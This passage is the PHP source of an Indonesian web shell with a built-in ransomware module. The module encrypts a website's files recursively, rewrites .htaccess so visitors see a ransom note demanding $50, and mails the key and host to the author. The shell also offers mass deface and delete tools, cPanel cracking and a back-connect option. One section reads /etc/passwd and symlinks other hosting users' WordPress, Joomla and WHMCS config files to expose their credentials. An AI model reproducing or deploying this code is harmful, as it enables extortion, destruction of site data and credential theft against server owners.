rYgICAgIMK2wrYgICAgwrbCtiAgIMK2wrYgIAogwrbCtsK2ICAgIMK2wrbCtsK2ICDCtsK2ICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgIMK2wrYgIMK2wrbCtsK2ICAgIMK2wrbCtiAKwrbCtiAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrYgICAgICAgwrbCtsK2wrbCtsK2wrYgICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgICAgICDCtsK2CsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtgogIMK2wrbCtsK2IMK2wrbCtsK2wrYgICAgICDCtsK2wrbCtsK2ICAgICAgICAgICAgICDCtsK2wrYgwrbCtiAgICAgwrbCtsK2wrbCtsK2IMK2wrbCtiAKICAgICAgICAgIMK2wrbCtsK2wrbCtiAgwrbCtsK2ICDCtsK2ICAgICAgICAgICDCtsK2ICDCtsK2wrYgIMK2wrbCtsK2wrbCtiAgICAgICAgCiAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2IMK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2IMK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIMK2wrYgwrbCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtsK2ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIMK2wrbCtsK2ICDCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtiAgIMK2wrbCtsK2wrYgICAgICAgICAgICAgIAogICAgICAgICAgICDCtsK2wrbCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgIMK2wrYgwrbCtsK2wrbCtiAgICAgICAgICAgIAogICAgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrYgICAgICAgICAgICAgICAgIMK2wrYgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgICAgCiAgIMK2wrYgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrYgICAgICAgICAgwrbCtiAgIAogICAgwrbCtsK2ICAgICDCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrYgICAgIMK2wrbCtiAgICAKICAgICAgwrbCtiAgIMK2wrbCtiAgICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgICAgICAgICDCtsK2wrYgICDCtsK2ICAgICAgCiAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAKICAgICAgIMK2wrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2ICAgICAgIAo8L2ZvbnQ+CjxoMT4gIApZb3VyIHNpdGUgaXMgbG9ja2VkIGJ5IHRoZSBjdXN0b20gcmFuc29td2FyZSBlbmNyeXB0aW9uIG1ldGhvZApQbGVhc2UgcGF5IDxmb250IGNvbG9yPSJnb2xkIj4kNTA8L2ZvbnQ+IHRvIDxhIGNsYXNzPSJ0eXBlMSIgaHJlZj0iaHR0cDovL3dhLm1lLys2Mjg1Nzc5MDAwMTE2Ij48Zm9udCBjb2xvcj0icmVkIj50YW1wYW5za3k8L2ZvbnQ+PC9hPiB0byByZXN0b3JlIHlvdXIgd2Vic2l0ZSB0aGF0IGlzIGxvY2tlZApPciB3aXRoaW4gMjQgaG91cnMgYWxsIHlvdXIgZmlsZXMgb24gdGhpcyB3ZWJzaXRlIHdpbGwgYmUgZGVsZXRlZCA8L2g+Cjxmb250IGNvbG9yPSJ3aGl0ZSI+LVsgPC9mb250PjxhIGNsYXNzPSJ0eXBlMSIgaHJlZj0ibWFpbHRvOnRhbXBhbnNreXl0QGdtYWlsLmNvbSI+PGZvbnQgY29sb3I9ImdyZWVuIj50YW1wYW5za3l5dEBnbWFpbC5jb208L2ZvbnQ+PC9hPiA8Zm9udCBjb2xvcj0id2hpdGUiPl0tPC9mb250Pgo8Zm9udCBjb2xvcj0iZ29sZCI+PDwvZm9udD48Zm9udCBjb2xvcj0icmVkIj4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTwvZm9udD48Zm9udCBjb2xvcj0iZ29sZCI+PjwvZm9udD4KVGhpcyBpcyBhIG5vdGljZSBvZiA8YSBjbGFzcz0idHlwZTEiIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiPjxmb250IGNvbG9yPSJncmVlbiI+cmFuc29td2FyZTwvZm9udD48L2E+PGJyPgpIb3cgdG8gcmVzdG9yZSB0aGUgYmVnaW5uaW5nPwpQbGVhc2UgY29udGFjdCB1cyB2aWEgZW1haWwgbGlzdGVkCjwvaDE+CjwvcHJlPgogICAgPC9jZW50ZXI+CjwvYm9keT4KCjwvaHRtbD4KPGJyPg=="; # URL yang akan mengubah tampilan , atau bisa di isi langsung dengan script base64.
        public $report_to = "tampanskyyt@gmail.com"; # report ransomware;
        public function __construct()
        { ?>
            <!DOCTYPE html>
            <html>

            <head>
                <title>Privat Ransomware.</title>
                <meta charset="utf-8">
                <meta name="author" content="Tampansky">
                <meta name="description" content="{ SkyWare }">
                <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
                <meta property="og:description" content="[+] Panthom Sky Coders Teamz [+]" />

                <?php function style()
                { ?>
                    <style type="text/css">
                        html,
                        body {
                            font-family: "Righteous";
                            background: #000;
                            color: #eee;
                        }

                        pre {
                            font-family: "Righteous";
                        }

                        input,
                        select {
                            color: #eee;
                            background: #000;
                            padding: 6px;
                            border: 1px solid #f00;
                            font-family: "Righteous";
                        }

                        a {
                            color: #f00;
                            text-decoration: none;
                            font-family: "Righteous";

                        }

                        a:hover {
                            text-decoration: underline;
                            color: #eee;
                            font-family: "Righteous";
                        }

                        textarea {
                            background: transparent;
                            border: 1px solid #ffffff;
                            width: 100%;
                            height: 400px;
                            padding-left: 5px;
                            margin: 10px auto;
                            resize: none;
                            color: #ffffff;
                            font-family: "Righteous";
                            font-size: 13px;
                        }
                    </style>
            </head>
        <?php }

                style()
        ?>

        <body>

            <fieldset style="max-width: 800px;margin: 0 auto;box-shadow: 0px 0px 20px #f00">
                <legend>Skyware { Privat Ransom_Ware }</legend>
                <pre>
Your IP : <?= gethostbyname(); ?>

STATUS : <?= (is_writable($this->locate())) ? "<font color=lime>RANSOMABLE</font>" : "<font color=red>UNRANSOMABLE</font> on ";
            echo " on " . $this->locate() . "<br>"; ?>
S57RSW : <?= (file_exists('.hts57rsw')) ? "<font color=lime>THIS SERVER INFECTED skyware</font>" : "<font color=red>THIS SERVER STILL SECURE FROM S57RSW</font>"; ?>
</pre><?php
            if (empty($_POST['opt']) && empty($_POST['key'])) {
        ?>

                    <form method="post">
                        <label>Input key :: </label>
                        <input name="key" placeholder="key" required>
                        <select name="opt">
                            <option>- skyw4r3 -</option>
                            <option value="e">Encrypt</option>
                            <option value="d">Decrypt</option>
                        </select>
                        <input type="submit" value=">>">
                    </form>
                <?php
            } else {
                echo "[ <a href='?'>Back </a>] <br>";
                $opt = $_POST['opt'];
                $key = $_POST['key'];
                switch ($opt) {
                    case 'e':
                        $this->s57runrsw($this->locate(), 'e', $key);
                        break;
                    case 'd':
                        $this->s57runrsw($this->locate(), 'd', $key);
                        break;
                }
            }
                ?>
            </fieldset>
        </body>

            </html><?php
                }
                public function s57init()
                {
                    if (!file_exists('.htskyw4r3')) {
                        if (file_exists('.htaccess')) {
                            rename('.htaccess', '.htskyw4r3');
                        } else {
                            touch('.htaccess');
                            rename('.htaccess', '.htskyw4r3');
                        }
                        $fp = fopen('.htaccess', 'w');
                        $htc = "# skyware ! [ encrypted at " . date('D , d M Y H:i:s') . " ]\r\nDirectoryIndex skyw4r3.php\r\nErrorDocument 404 /skyw4r3.php";
                        fwrite($fp, $htc);
                        echo ".... Manipulating <i><b>.htaccess</b></i> DONE .... <br>";
                    }
                    if (preg_match("/^http/", $this->msg)) {
                        $msg = file_get_contents($this->msg);
                    } else {
                        $msg = base64_decode($this->msg);
                    }
                    if (file_put_contents('skyware.php', $msg)) {
                        echo "\n.... Manipulating <i><b>Index & Change display of page</b></i>  DONE .... \n";
                    }
                }

                public function s57unit()
                {
                    if (file_exists('.hts57rsw')) {
                        if (unlink('.htaccess') && unlink('skyware.php')) {
                            echo ".... Restore <i><b>.htaccess</b></i> DONE .... <br>";
                            echo ".... Restore <i><b>Index files</b></i> DONE ....<br>";
                        }
                        rename('.hts57rsw', '.htaccess');
                    }
                }
                public function s57ended($npy, $method)
                {
                    switch ($method) {
                        case 'e':
                            rename($npy, $npy . ".skyw4r3");
                            break;
                        case 'd':
                            $npys = str_replace(".skyw4r3", "", $npy);
                            rename($npy, $npys);
                            break;
                    }
                }
                public function enkontol($key, $pwd)
                {
                    $data = file_get_contents($pwd);
                    $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);
                    $encrypted = base64_encode($iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv));
                    if (file_put_contents($pwd, $encrypted)) {
                        echo "[<font color=lime>LOCKED</font>][" . date('d:m:Y') . "] => " . $pwd . " <br>";
                    } else {
                        echo "[<font color=red>FAILED</font>][" . date('d:m:Y') . "] => " . $pwd . " <br>";
                    }
                }
                public function dekontol($key, $pwd)
                {
                    $data = base64_decode(file_get_contents($pwd));
                    $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
                    $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)), MCRYPT_MODE_CBC, $iv), "\0");
                    if (file_put_contents($pwd,  $decrypted)) {
                        echo "[<font color=lime>UNLOCKED</font>][" . date('d:m:Y') . "] => " . $pwd . " <br>";
                    } else {
                        echo "[<font color=red>--FAILED</font>][" . date('d:m:Y') . "] => " . $pwd . " <br>";
                    }
                }
                public function kecuali($ext, $name)
                {
                    $re = "/({$name})/";
                    preg_match($re, $ext, $matches);
                    if ($matches[1]) {
                        return false;
                    }
                    return true;
                }
                public function s57runrsw($dir, $method, $key)
                {
                    switch ($method) {
                        case 'e':
                            $this->s57init();
                            break;
                        case 'd':
                            $this->s57unit();
                            break;
                    }
                    $s = scandir($dir);
                    foreach ($s as $d) {
                        if ($d != '.' && $d != '..') {
                            $locate = $dir . DIRECTORY_SEPARATOR . $d;
                            if (!is_dir($locate)) {
                                if (
                                    $this->kecuali($locate, "skyw4r3.php") &&
                                    $this->kecuali($locate, ".png")  &&
                                    $this->kecuali($locate, ".htaccess")  &&
                                    $this->kecuali($locate, "skyw4r3.php") &&
                                    $this->kecuali($locate, "index.php") &&
                                    $this->kecuali($locate, ".hts57rsw")
                                ) {
                                    switch ($method) {
                                        case 'e':
                                            $this->enkontol($key, $locate);
                                            $this->s57ended($locate, 'e');
                                            break;
                                        case 'd':
                                            $this->dekontol($key, $locate);
                                            $this->s57ended($locate, 'd');
                                            break;
                                    }
                                }
                            } else {
                                $this->s57runrsw($locate, $method, $key);
                            }
                        }
                        $this->plus();
                    }
                    $this->report($key);
                }
                public function report($key)
                {
                    $message .= "=========     Report Ransomware    =========\n";
                    $message .= "Server    : " . $_SERVER['HTTP_HOST'] . "\n";
                    $message .= "Key       : " . $key . "\n";
                    $message .= "Encrypted : " . date('D , d M Y H:i:s') . "\n";
                    $message .= "========= Indonesian (2018) Ransomware =========\n";
                    $subject = "[RANSOMWARE][" . $_SERVER['HTTP_HOST'] . "]";
                    $headers = "From: skyware <ransomeware@skyware.today>\r\n";
                    mail($this->report_to, $subject, $message, $headers);
                }
                public function plus()
                {
                    flush();
                    ob_flush();
                }
                public function locate()
                {
                    return getcwd();
                }
            }

            if (isset($_REQUEST["ransom"])) {
                new skyw4r3_rsw();
                die;
            }
                    ?>
    <?php
    @clearstatcache();
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @ini_set('output_buffering', 0);
    @ini_set('display_errors', 0);
    header("X-XSS-Protection: 0");
    ini_set('display_errors', FALSE);
    ini_set("memory_limit", "2000M");
    ini_set("safe_mode", "off");
    if (get_magic_quotes_gpc()) {
        foreach ($_POST as $key => $value) {
            $_POST[$key] = stripslashes($value);
        }
    }
    if (isset($_REQUEST['info'])) {
        echo '
        <div class="asu">
            <div class="loader"></div>
            <hr color="white">
            <font>
            [# Authoer : Tampansky [<a href="https://www.instagram.com/_hadiprass_" target="_blink">Hadiprasetia</a>]<br>
            [# Contact : 085779000116<br>
            [# Email : tampanskyyt@gmail.com<br>
            [# Team : Panthom Sky Coders Teamz<br>
            [# Spesial Thanks To : Allah SWT - My Family - PSCT Family And Official<br>
            <br>
            </font>
            <center>&copy; PS - Tampansky || Hadiprass</center>
            </div>
            ';
        echo '<script type="text/javascript">
            new TypingText
                (document.getElementById("message"),
                    50,
                    function(i) {
                        var ar =
                            new Array("/", "_", "/", "_");
                        return " " +
                            ar[i.length % ar.length];
                    }
                );
            //Type out examples:
            TypingText.runAll();
        </script>';
        die;
    }
    if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['opt'] == 'download')) {
        @ob_clean();
        $file = $_GET['file'];
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    $host = $_SERVER["LOGON_USER"];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $host = $_SERVER['HTTP_HOST'];
    $root = $_SERVER['DOCUMENT_ROOT'];
    $software = $_SERVER['SERVER_SOFTWARE'];
    $admin = $_SERVER['SERVER_ADMIN'];

    $disable_functions = @ini_get("disable_functions");
    chdir($dir);
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
        chdir($path);
    } else {
        $path = getcwd();
    }
    if (isset($_GET['dir'])) {
        $dir = $_GET['dir'];
        chdir($dir);
    } else {
        $dir = getcwd();
    }
    echo "<center>
<img src='https://1.bp.blogspot.com/-syCebLggRBk/XYoVthUcpBI/AAAAAAAABF0/rejz5Ty-8BAB0y0koy1uK4yVR4roMhTDACLcBGAsYHQ/s320/a%2BPSCT%2BNEW%2BLOGO.jpg' rel='icon' type='image/x-icon' onmousedown='return false' oncontextmenu='return false' onselectstart='return false'>
<hr color='white'>
<div id='menu'>
        <hr color='red'><a href='?' class='btn tombol' class='btn btn-secondary btn-block bg-transparent mt-3' id='load'><i class='fas fa-tachometer-alt'></i> HOME</a> ";
    printf("<a href='?path=$path&&sky=uploads' class='btn tombol'><i class='fas fa-upload'></i> Upload</a> ");
    echo " <a href='?path=$path&&sky=root' class='btn tombol'><i class='fas fa-upload'></i> RooT Uploader</a> ";
    echo " <a href='?path=$path&&sky=crackcpanel' class='btn tombol'><i class='fas fa-warning'></i> Crack CPanel</a> ";
    echo " <a href='?path=$path&&sky=safemode' class='btn tombol'><i class='fa fa-shield'></i> SafeMode</a> ";
    echo " <a href='?path=$path&&sky=jso' class='btn tombol'><i class='fas fa-code'></i> Jso</a> ";
    echo " <a href='?path=$path&&sky=massdeface' class='btn tombol'><i class='fas su fa-folder'></i> Mass Deface</a> ";
    echo " <a href='?path=$path&&sky=csrf' class='btn tombol'><i class='fas fa-flask'></i> CSRF</a> ";
    echo " <a href='?path=$path&&x=vn' class='btn tombol'><i class='fas fa-search'></i> Domain Viewer</a> ";
    echo " <a href='?path=$path&&sky=sym' class='btn tombol'><i class='fas fa-link'></i> Symlink</a> ";
    echo " <a href='??path=$path&&sky=jumping' class='btn tombol'><i class='fas fa-sitemap'></i> jumping</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=infosys'><i class='fas fa-bug'></i> Info Website</a>";
    echo " <a class='btn tombol' href='?path=$path&do=mass_delete'><i class='fas fa-trash'></i> Mass Delete</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=config'><i class='fas fa-anchor'></i> Config</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=krdp_shell'><i class='fas fa-desktop'></i> KRDP shell</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=fake_root'><i class='fas fa-spinner'></i> Fake Root</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=auto_edit_user'><i class='fa fa-user'></i> Auto Edit User</a>";
    echo "<a class='btn tombol' href='?path=$path&do=auto_wp'><i class='fa fa-user-o'></i> Auto Edit Title</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=network'><i class='fas fa-signal'></i> Network</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=adminer'><i class='fa fa-user-o'></i> Adminer</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=adminer'><i class='fa fa-user-o'></i> Adminer 2</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=symlink'><i class='fas fa-unlink'></i> Symlink</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=whois'><i class='fas fa-question'></i> Whois</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=cgi2'><i class='fas fa-warning'></i> C-77</a> ";
    echo "<a class='btn tombol' href='?path=$path&do=defacerid'><i class='fas su fa-folder'></i> DefacerID</a> ";
    echo "<a class='btn tombol' href='?path=$path&go=ransom'><i class='fas fa-warning'></i> Privat Ransom</a>";
    echo "<a class='btn tombol' href='?path=$path&do=bconnet'><i class='fa fa-reply'></i> Back Connect</a>";
    echo " <a href='??path=$path&&info' class='btn tombol'><i class='fas fa-info-circle'></i> Credits</a> ";
    echo "
        <hr>";
    echo '<audio autoplay><source src="https://www.soundjay.com/button/button-1.wav" type="audio/mpeg"></audio>';

    echo "<p>";
    echo "Current DIR: ";
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);

    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $a = true;
            echo '<a href="?path=/">/</a>';
            continue;
        }
        if ($pat == '') continue;
        echo '<a href="?path=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id) echo "/";
        }
        echo '">' . $pat . '</a>/';
    }
    echo "<br> <br><a class='btn tombol'href='?path=$path&do=newfile'> New File  <i class='fa fa-plus-square'></i></a> ";
    echo " <a class='btn tombol'href='?path=$path&do=newfolder'> New Folder  <i class='fa fa-plus-square'></i></a></div></div></div>";
    if ($_GET['sky'] == 'about') {
        echo '
    <font>
    [=> Authoer : Tampansky [<a href="https://www.instagram.com/_hadiprass_" target="_blink">Hadiprasetia</a>]<br>
    [=> Contact : 087887986528<br>
    [=> Email : tampanskyyt@gmail.com<br>
    [=> Team : Panthom Sky Coders Teamz<br>
    [=> Spesial Thanks To : Allah SWT - My Family - PSCT Family And Official<br>
    </font>
    ';
        echo '
    <script type="text/javascript">
    const secondHand = document.querySelector(".jarum_detik");
    const minuteHand = document.querySelector(".jarum_menit");
    const jarum_jam = document.querySelector(".jarum_jam");

    function setDate() {
        const now = new Date();

        const seconds = now.getSeconds();
        const secondsDegrees = ((seconds / 60) * 360) + 90;
        secondHand.style.transform = `rotate(${secondsDegrees}deg)`;
        if (secondsDegrees === 90) {
            secondHand.style.transition = "none";
        } else if (secondsDegrees >= 91) {
            secondHand.style.transition = "all 0.05s cubic-bezier(0.1, 2.7, 0.58, 1)"
        }

        const minutes = now.getMinutes();
        const minutesDegrees = ((minutes / 60) * 360) + 90;
        minuteHand.style.transform = `rotate(${minutesDegrees}deg)`;

        const hours = now.getHours();
        const hoursDegrees = ((hours / 12) * 360) + 90;
        jarum_jam.style.transform = `rotate(${hoursDegrees}deg)`;
    }

    setInterval(setDate, 1000)
    </script>
    ';
        die();
    }
    if ($_GET['sky'] == "csrf") {
        echo '<br>
<hr color="white"><form method="post">
URL / LINK: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.co.il/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value=">">
</form>
<hr color="white">';
        $url = $_POST['url'];
        $pf = $_POST['pf'];
        $d = $_POST['d'];
        if ($d) {
            echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
        }
        echo '<p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>';
        echo '
    <script type="text/javascript">
    const secondHand = document.querySelector(".jarum_detik");
    const minuteHand = document.querySelector(".jarum_menit");
    const jarum_jam = document.querySelector(".jarum_jam");

    function setDate() {
        const now = new Date();

        const seconds = now.getSeconds();
        const secondsDegrees = ((seconds / 60) * 360) + 90;
        secondHand.style.transform = `rotate(${secondsDegrees}deg)`;
        if (secondsDegrees === 90) {
            secondHand.style.transition = "none";
        } else if (secondsDegrees >= 91) {
            secondHand.style.transition = "all 0.05s cubic-bezier(0.1, 2.7, 0.58, 1)"
        }

        const minutes = now.getMinutes();
        const minutesDegrees = ((minutes / 60) * 360) + 90;
        minuteHand.style.transform = `rotate(${minutesDegrees}deg)`;

        const hours = now.getHours();
        const hoursDegrees = ((hours / 12) * 360) + 90;
        jarum_jam.style.transform = `rotate(${hoursDegrees}deg)`;
    }

    setInterval(setDate, 1000)
    </script>
    ';
        die();
    }
    if (isset($_GET['x']) && ($_GET['x'] == 'vn')) {
    ?>
        <form action="?path=<?php echo $path; ?>&amp;x=vn" method="post">
            <center>
                <h2>Domain Viewer</h2>
            </center><br><br>
        <?php
        function openBaseDir()
        {
            $openBaseDir = ini_get("open_basedir");
            if (!$openBaseDir) {
                $openBaseDir = '<font color="green">OFF</font>';
            } else {
                $openBaseDir = '<font color="red">ON</font>';
            }
            return $openBaseDir;
        }


        echo '
				    <table width="95%" cellspacing="0" cellpadding="0"  >
				    <td height="100" align="left" >';
        $pg = basename(__FILE__);
        $safe_mode = @ini_get('safe_mode');
        $dir = @getcwd();
        ////////////////////////////////////////////////////
        #.htaccess
        @mkdir('skylink', 0777);
        @symlink("/", "skylink/root");
        $htaccss = "Options all \n
				 DirectoryIndex Sux.html\n
				 AddType text/plain .php\n
				 AddHandler server-parsed .php\n
				 AddType text/plain .html\n
				 AddHandler txt .html\n
				 Require None\n
				 Satisfy Any\n";
        file_put_contents("skylink/.htaccess", $htaccss);
        $etc = file_get_contents("/etc/passwd");
        $etcz = explode("\n", $etc);


        ##Symlink to the ROOT :p
        foreach ($etcz as $etz) {
            $etcc = explode(":", $etz);
            error_reporting(0);

            $current_dir = posix_getcwd();
            $dir = explode("/", $current_dir);

            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/wp-config.php', "skylink/" . $etcc[0] . '-WordPress.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/blog/wp-config.php', "skylink/" . $etcc[0] . '-WordPress.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/wp/wp-config.php', "skylink/" . $etcc[0] . '-WordPress.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/site/wp-config.php', "skylink/" . $etcc[0] . '-WordPress.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/config.php', "skylink/" . $etcc[0] . '-PhpBB.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/includes/config.php', "skylink/" . $etcc[0] . '-vBulletin.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/configuration.php', "skylink/" . $etcc[0] . '-Joomla.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/web/configuration.php', "skylink/" . $etcc[0] . '-Joomla.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/joomla/configuration.php', "skylink/" . $etcc[0] . '-Joomla.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/site/configuration.php', "skylink/" . $etcc[0] . '-Joomla.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/conf_global.php', "skylink/" . $etcc[0] . '-IPB.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/inc/config.php', "skylink/" . $etcc[0] . '-MyBB.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/Settings.php', "skylink/" . $etcc[0] . '-SMF.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/sites/default/settings.php', "skylink/" . $etcc[0] . '-Drupal.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/e107_config.php', "skylink/" . $etcc[0] . '-e107.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/datas/config.php', "skylink/" . $etcc[0] . '-Seditio.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/includes/configure.php', "skylink/" . $etcc[0] . '-osCommerce.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/client/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/clientes/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/support/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/supportes/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/whmcs/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/domain/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/hosting/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/whmc/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/billing/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/portal/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/order/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/clientarea/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
            symlink('/' . $dir[1] . '/' . $etcc[0] . '/' . $dir[3] . '/domains/configuration.php', "skylink/" . $etcc[0] . '-WHMCS.txt');
        }
        #############################
        if (is_readable("/var/named")) {
            echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
            echo '<tr><td><center><b>SITE</b></center></td><td>
					<center><b>USER</b></center></td>
					<td></center><b>SYMLINK</b></center></td>';
            $list = scandir("/var/named");
            foreach ($list as $domain) {
                if (strpos($domain, ".db")) {
                    $i += 1;
                    $domain = str_replace('.db', '', $domain);
                    $owner = posix_getpwuid(fileowner("/etc/valiases/" . $domain));

                    echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td>
					<td class='td1'><center><font color='red'>" . $owner['name'] . "</font></center></td>
					<td class='td1'><center><a href='skylink/root" . $owner['dir'] . "/" . $dir[3] . "' target='_blank'>DIR</a></center></td>";
                }
            }
            echo "<center>Total Domains Found: " . $i . "</center><br />";
        } else {
            echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>";
        }
        echo '
        <script type="text/javascript">
        const secondHand = document.querySelector(".jarum_detik");
        const minuteHand = document.querySelector(".jarum_menit");
        const jarum_jam = document.querySelector(".jarum_jam");
    
        function setDate() {
            const now = new Date();
    
            const seconds = now.getSeconds();
            const secondsDegrees = ((seconds / 60) * 360) + 90;
            secondHand.style.transform = `rotate(${secondsDegrees}deg)`;
            if (secondsDegrees === 90) {
                secondHand.style.transition = "none";
            } else if (secondsDegrees >= 91) {
                secondHand.style.transition = "all 0.05s cubic-bezier(0.1, 2.7, 0.58, 1)"
            }
    
            const minutes = now.getMinutes();
            const minutesDegrees = ((minutes / 60) * 360) + 90;
